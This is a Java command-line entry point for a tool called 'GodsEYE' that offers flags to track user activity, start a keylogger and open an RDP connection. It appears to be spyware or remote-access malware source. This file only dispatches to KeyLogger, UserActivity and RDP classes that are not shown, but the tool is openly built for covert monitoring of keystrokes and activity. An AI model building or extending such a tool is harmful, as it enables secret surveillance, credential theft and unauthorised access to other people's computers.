package com.bufferoverflow;

import com.bufferoverflow.utils.KeyLogger;
import com.bufferoverflow.utils.RDP;
import com.bufferoverflow.utils.UserActivity;
import picocli.CommandLine;

import java.security.Key;
import java.util.concurrent.Callable;

import static picocli.CommandLine.*;

@Command(name = "GodsEYE", description = "Invoke the beast \uD83D\uDC7F", mixinStandardHelpOptions = true, version = "God's EyE 1.0")
public class Main implements Callable<String> {


    @Option(names = "-t", description = "Track the user Activity")
    private boolean track;

    @Option(names = "-f", description = "FileName")
    private String file;

    @Option(names = "-l", description = "Start logging Keys")
    private boolean log;

    @Option(names = "-r", description = "Start the rdp connection")
    private boolean rdp;

    public static void main(String[] args) {
        int exitCode = new CommandLine(new Main()).execute(args);
        System.exit(exitCode);
    }

    @Override
    public String call() throws Exception {
        // Place where we execute the commands defined above.
        if(track){
            UserActivity.main(file);
        }
        if(log){
            KeyLogger.main();
        }
        if (rdp){
            RDP.main();
        }
        return "Success";
    }
}